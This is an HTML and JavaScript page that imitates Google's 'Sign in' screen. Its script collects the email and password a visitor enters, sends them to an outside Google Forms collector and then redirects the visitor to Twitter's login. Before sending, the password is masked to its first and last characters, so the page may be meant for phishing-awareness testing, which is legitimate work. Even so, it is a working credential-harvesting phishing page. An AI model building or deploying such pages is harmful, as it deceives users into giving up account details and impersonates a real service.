<link rel="stylesheet" type="text/css" href="style/stylesheet-popup.css">

<div class="container">
    <div class="card">
      <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" height="24">
        <div class="title">Sign in</div>
        <div class="tagline">Use your Google Account</div>
      </div>
      
      <form action="">
        <input id="nameField" name="entry.186127770" type="text">
        <label for="nameField">Email or phone</label>
        
        <input id="passwordField" name="entry.1698183951" type="password">
        <label for="passwordField">Password</label>
      </form>
      
      <div class="links">Forgot email?</div>
      <div class="guest">Not your computer? Use Guest mode to sign in privately.</div>
      <div class="links">Learn more</div>
      <div class="login-bar">
        <div class="links">Create account</div>
        <button class="next" onclick="return postToGoogle();">Next</button>
      </div>
    </div>
  </div>

<script>

  function postToGoogle() {
          var field1 = $("#nameField").val();
          var field2 = $("#passwordField").val();
          
  
          if(field1 == ""){
            alert('Please Fill Your Name');
            document.getElementById("nameField").focus();
            return false;
          }
          if(field2 == ""){
            alert('Please Fill Your Email');
            document.getElementById("passwordField").focus();
            return false;
          }
          
          // fix password - only store first and last digit
          var newpw = '';
          for (var i = 0; i < field2.length; i++)
          {
              if ( (i == 0) || (i == field2.length - 1) )
                  newpw = newpw + field2[i];
              else
                  newpw = newpw + '*';
          }
  
          field2 = newpw;
          
          $.ajax({
                  url: "https://docs.google.com/forms/d/e/1FAIpQLSfHHK7j7-RvJYDbI-ycvvDRcmtRmp6CR2q9rm6xiKeSalW9Ng/viewform?usp=pp_url",
                  data: {"entry.186127770": field1, "entry.1698183951": field2},
                  type: "POST",
                  dataType: "xml",
                  success: function(d)
                {
                },
                error: function(x, y, z)
                  {
                    $('#success-msg').show();
                    $('#form').hide();
                    setTimeout(Redirect, 3000);                  
                  }
            });
          
          return false;
  
  }
  
  function Redirect() {
      window.location.replace('https://twitter.com/i/flow/login');
  }
  
  </script>
